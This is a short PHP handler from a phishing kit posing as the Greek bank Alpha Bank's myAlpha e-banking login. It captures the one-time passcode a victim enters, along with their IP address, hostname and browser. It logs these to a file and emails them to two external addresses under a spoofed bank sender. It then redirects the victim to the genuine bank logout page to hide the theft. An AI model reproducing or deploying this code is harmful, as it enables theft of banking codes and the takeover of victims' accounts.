<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$msg .= "\n";
$msg .= "myAlphaCode 2 : ".$_POST['otp-input']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName: ".$hostname."\n";
$msg .= "UserAgent: ".$u_agent."\n";
$msg .= "\n";
$msg .= "--------------myAlpha------------\n\n";
$post = "abs0000100@gmail.com,abs00001000@hotmail.com";
$fp = fopen("../shoot.txt","a");
fputs($fp,$msg);
fclose($fp);
$subj = "$ip - ".$_POST['otp-input']."\n";
$from = "From: FinishCode<ebankingsupport@alpha.gr>";
mail("$post",$subj, $msg, $from);
header("Location:  https://www.alpha.gr/el/idiotes/myAlpha/myalpha-logout");  

?>
